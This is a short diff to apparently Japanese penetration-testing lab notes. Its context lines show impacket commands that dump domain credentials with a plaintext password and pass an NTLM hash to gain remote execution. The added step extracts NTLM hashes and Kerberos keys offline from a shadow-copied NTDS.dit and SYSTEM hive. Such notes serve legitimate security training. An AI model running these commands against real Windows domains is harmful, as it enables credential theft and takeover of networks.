@@ -49,3 +49,8 @@ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorate
 ```
 /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.209.73
 ```
+
+8. WindowsのシャドウコピーからダンプしたバックアップファイルをKaliのローカルで解析して資格情報を抽出する。これでNTLMハッシュやKerberosのキーが取得できる。
+```
+impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
+```
